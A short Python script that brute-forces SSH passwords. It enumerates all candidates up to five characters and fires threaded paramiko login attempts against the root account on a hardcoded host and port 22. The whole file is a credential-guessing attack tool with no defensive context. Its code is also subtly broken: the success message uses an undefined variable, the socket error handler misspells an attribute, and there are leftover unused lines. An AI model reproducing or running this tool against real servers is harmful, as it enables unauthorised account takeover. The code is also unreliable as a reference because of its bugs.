import crypt
import itertools
import os
import paramiko
import socket
import string
import sys
import threading
import time

PASS_SIZE = 5
IP = "127.0.0.1"
USER = "root"
PORT = 22


def bruteforce_list(charset, maxlength):
    return (''.join(candidate) for candidate in itertools.chain.from_iterable(
        itertools.product(charset, repeat=i)
        for i in range(1, maxlength+1)))


def attempt(Password):
    var = itertools.combinations(string.digits, PASS_SIZE)
    ssh_client = paramiko.SSHClient()
    ssh_client.load_system_host_keys()
    ssh_client.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
    
    try:
        ssh_client.connect(IP, port=PORT, username=USER, password=Password, banner_timeout=200)
        print("Password found: " + passwd)
        return
    except paramiko.AuthenticationException:
        print("Failed Attempt: "+Password)
    except socket.error:
        print(socket.rror)
    except paramiko.ssh_exception.SSHException:
        ssh_client.close()
    except EOFError:
        pass


if __name__ == '__main__':
    letters_list='qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&*(),./;'
    for i in bruteforce_list(letters_list, PASS_SIZE):
        t = threading.Thread(target=attempt, args=(i,))
        t.start()
        time.sleep(0.3)
